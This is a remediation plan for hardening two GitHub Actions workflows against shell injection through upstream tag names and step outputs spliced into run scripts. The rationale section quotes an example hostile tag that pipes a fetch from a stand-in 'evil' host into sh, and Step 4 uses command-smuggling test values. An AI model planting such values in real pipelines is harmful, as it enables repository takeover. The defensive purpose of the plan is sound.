# Plan 007: Eliminate shell injection via upstream tag names; harden `${{ }}` splicing in workflows

> **Executor instructions**: Follow this plan step by step. Run every
> verification command and confirm the expected result before moving to the
> next step. If anything in the "STOP conditions" section occurs, stop and
> report — do not improvise. When done, update the status row for this plan
> in `plans/README.md` — unless a reviewer dispatched you and told you they
> maintain the index.
>
> **Drift check (run first)**: `git diff --stat 61449aa..HEAD -- .github/workflows/sync-hermes-on-release.yml .github/workflows/sync-docs.yml`
> If either file changed since this plan was written, compare the
> "Current state" excerpts against the live code before proceeding; on a
> mismatch, treat it as a STOP condition.

## Status

- **Priority**: P1 (low likelihood, high blast radius, trivial fix)
- **Effort**: S
- **Risk**: LOW
- **Depends on**: none — but plan 008 edits the SAME two files; land this first and rebase 008
- **Category**: security
- **Planned at**: commit `61449aa`, 2026-07-06

## Why this matters

`.github/workflows/sync-hermes-on-release.yml` fetches the latest tag name from the **third-party** repo `NousResearch/hermes-agent` and splices it into `run:` shell scripts via `${{ steps.check.outputs.version }}`. GitHub Actions performs `${{ }}` substitution *textually before* the shell parses the script, so quoting does not help: a tag named `v1"; curl evil | sh; "` executes in a job that holds `contents: write`, `pull-requests: write`, and (in the auto-merge step) a PAT. Git tag names legally contain `$`, `;`, quotes, and parens. The maintainer does not control that repo's tags — this is a real, if low-likelihood, repo-compromise vector.

The standard fix: pass untrusted values into the shell through `env:` (the value becomes a real environment variable, never parsed as script text), and validate the tag against a strict format before first use.

Secondarily, `sync-docs.yml` splices its own step outputs into `run:` blocks the same way. Today those values are regex-constrained during construction (skill names, `$APP_[A-Z_]+` env-var names, version numbers, URLs from the repo's own sync.json), so this is **not currently exploitable** — but the pattern is one upstream-content change away from being the hermes bug. Convert the same way as defense-in-depth.

## Current state

`.github/workflows/sync-hermes-on-release.yml`:
- Lines 28–46 (step `check`): `LATEST=$(gh api repos/NousResearch/hermes-agent/releases/latest --jq '.tag_name // empty' ...)` with a tags fallback; the value is emitted as the step output `version`.
- Line 77 (step `version`): `VERSION="${{ steps.check.outputs.version }}"`
- Line 137 (bump step): `VERSION="${{ steps.check.outputs.version }}"`
- Line ~154 (branch step): `VERSION="${{ steps.check.outputs.version }}"` then `BRANCH_NAME="sync/hermes-${VERSION}"` used in `git push origin --delete`, checkout, commit.
- Search the file for ALL occurrences: `grep -n 'steps.check.outputs.version' .github/workflows/sync-hermes-on-release.yml` — every hit inside a `run:` block must be converted; hits inside `if:` conditions or `env:` values are safe to leave.

`.github/workflows/sync-docs.yml` (all inside `run:` blocks):
- Line 192/194: `if [ "${{ steps.sync.outputs.has_changes }}" == "true" ]` / `echo "**${{ steps.sync.outputs.changed_skills }}**"`
- Line 200/202: same for `has_failures` / `failed_skills`
- Line 207: `echo "${{ steps.sync.outputs.sync_reports }}" >> $GITHUB_STEP_SUMMARY`
- Line 213: `CHANGED="${{ steps.sync.outputs.changed_skills }}"`
- Line 220: `${{ steps.sync.outputs.changes }}` inside a heredoc-style `ENTRY="..."` assignment
- Lines 255, 267, 268: more of the same (`changed_skills`, `failed_skills`)
- Line 255 is inside a `gh pr create --body "..."` argument context — check it; if it's in a `with:`/args context rather than a `run:` script, it's lower priority but convert if trivial.

## Commands you will need

| Purpose | Command | Expected on success |
|---------|---------|---------------------|
| YAML parse | `python3 -c "import yaml; yaml.safe_load(open('.github/workflows/sync-hermes-on-release.yml')); yaml.safe_load(open('.github/workflows/sync-docs.yml')); print('OK')"` | `OK` |
| Residual check | `grep -n '\${{ steps\.' .github/workflows/sync-hermes-on-release.yml .github/workflows/sync-docs.yml` | hits ONLY in `if:` conditions and `env:` blocks |

## Scope

**In scope**: `.github/workflows/sync-hermes-on-release.yml`, `.github/workflows/sync-docs.yml`.
**Out of scope**: all other workflows, all scripts, release-please config. Do NOT change any step's logic — this is a pure value-passing refactor plus one added validation.

## Git workflow

- Branch: `advisor/007-workflow-injection-hardening` off `main`
- One commit: `fix(ci): pass untrusted/step-output values via env instead of \${{ }} splicing`
- Do NOT push or open a PR unless the operator instructed it.

## Steps

### Step 1: Validate the tag at the source (sync-hermes)

In the `check` step, immediately after `LATEST` is finalized (after the tags fallback), add:

```bash
          # Reject tag names that aren't plain version-ish strings — they get
          # interpolated into later shell steps and PR fields.
          if [ -n "$LATEST" ] && ! echo "$LATEST" | grep -qE '^[A-Za-z0-9._-]+$'; then
            echo "::error::Upstream tag name has unexpected characters: refusing to process"
            exit 1
          fi
```

**Verify**: YAML parse command → `OK`.

### Step 2: Convert every `run:`-block splice to env indirection (sync-hermes)

For each step whose `run:` contains `VERSION="${{ steps.check.outputs.version }}"`, add to that step:

```yaml
        env:
          VERSION: ${{ steps.check.outputs.version }}
```

and change the script line to remove the assignment (the env var `VERSION` is already set) or keep `VERSION="$VERSION"`-free by just deleting the line. Also convert any other `run:`-embedded `${{ steps.*.outputs.* }}` in this file the same way (e.g. if the PR-body step at ~line 175 splices `version` into a heredoc, route it through `env:` and use `$VERSION`).

**Verify**: `grep -n 'steps.check.outputs.version' .github/workflows/sync-hermes-on-release.yml` → every remaining hit is in an `if:` or `env:` line, none inside `run:` script text. YAML parses.

### Step 3: Same conversion in sync-docs.yml

For the step-summary step (lines ~188–207), the CHANGELOG step (~211–225), the PR-creation step (~250s), and the final-notification step (~267+): add an `env:` block per step mapping `CHANGED_SKILLS`, `FAILED_SKILLS`, `HAS_CHANGES`, `HAS_FAILURES`, `SYNC_REPORTS`, `CHANGES` to the corresponding `${{ steps.sync.outputs.* }}`, and rewrite the script bodies to use `"$CHANGED_SKILLS"` etc. For multi-line values (`SYNC_REPORTS`, `CHANGES`) use `printf '%s\n' "$SYNC_REPORTS" >> "$GITHUB_STEP_SUMMARY"` instead of `echo`. The `gh pr create --body` usage should take `--body "$PR_BODY"` where `PR_BODY` is assembled in-shell from env vars.

**Verify**: `grep -n '\${{ steps.sync.outputs' .github/workflows/sync-docs.yml` → hits only in `if:`/`env:` positions. YAML parses.

### Step 4: Behavioral smoke test

You cannot run these workflows locally. Instead: (a) YAML parse both files; (b) extract each modified `run:` block into a temp script with the env vars set to representative values — including a hostile one — and execute:

```bash
export VERSION='v1";echo INJECTED;"'
bash -c '<the converted script body of the version step>'
```

**Verify**: output does NOT contain a bare `INJECTED` line produced by execution (the hostile value must be treated as data). Repeat for the step-summary block with `SYNC_REPORTS='$(echo INJECTED)'` — with a stub `GITHUB_STEP_SUMMARY=/tmp/summary-test`; `grep -c 'INJECTED' /tmp/summary-test` should show the literal text (data), and no command execution.

## Test plan

Step 4 is the test. No test framework exists; do not add one.

## Done criteria

- [ ] Zero `${{ steps.*.outputs.* }}` occurrences inside `run:` script text in both files (grep shows only `if:`/`env:` usage)
- [ ] Tag-format validation present in the `check` step
- [ ] Both files pass YAML parse
- [ ] Hostile-value smoke test shows no execution
- [ ] `git status --porcelain` shows only the two workflow files (plus `plans/README.md`)

## STOP conditions

- A `run:` block uses a step output in a way that can't be routed through `env:` (e.g. inside a `with:` argument of a third-party action) — leave it, note it in your report.
- Converting a step changes its observable behavior in the smoke test (e.g. multi-line output now collapses) and you can't fix it with `printf` — report rather than reformatting the summary logic.
- The drift check fails (plan 008 may have landed first and moved lines) — re-locate by content, and if the version-bump steps are GONE from sync-hermes (008 removes them), skip converting the deleted steps and note it.

## Maintenance notes

- Rule going forward (worth adding to CLAUDE.md in some future docs pass): **never** place `${{ }}` inside `run:` script text; always route through `env:`. `if:` conditions and `env:` values are safe contexts.
- Plan 008 will delete some of the very steps this plan hardens (the inline version bumps) — landing 007 first is still correct (008 might not be selected/land), and the overlap is noted in both plans.
- Reviewer should scrutinize: the multi-line outputs (`SYNC_REPORTS`, `CHANGES`) render identically in the step summary and CHANGELOG after conversion.
